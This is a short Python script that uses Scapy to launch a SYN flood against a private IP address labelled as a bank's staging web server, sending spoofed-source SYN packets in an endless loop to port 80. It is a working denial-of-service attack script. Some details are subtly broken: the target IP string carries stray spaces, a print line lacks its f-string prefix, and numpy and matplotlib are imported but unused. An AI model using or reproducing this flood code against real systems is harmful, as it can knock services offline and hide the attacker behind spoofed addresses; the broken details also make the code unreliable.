import numpy as np
import matplotlib.pyplot as plt
from scapy.all import IP, TCP, send, RandIP, RandShort
import random

target_ip = " 10.248.120.181 " # NeoBank Staging Web Server
target_port = 80

def syn_flood ():

    print (f"[*] Initiating SYN Flood against { target_ip }:{ target_port }")
    i = 1
    while True :

        # Generate random spoofed IP addresses to bypass basic filtering
        spoofed_ip = ".". join (map (str , ( random . randint (1, 254) for _ in range
        (4) )))

        # Construct IP and TCP layers with SYN flag actively set
        ip_layer = IP( src= spoofed_ip , dst= target_ip )
        tcp_layer = TCP( sport = RandShort () , dport = target_port , flags ="S")

        # Send packet blindly at wire - speed without waiting for an ACK
        send ( ip_layer / tcp_layer , verbose = False )

        print("Simulation complete for IO {i}")
        i += 1

syn_flood ()
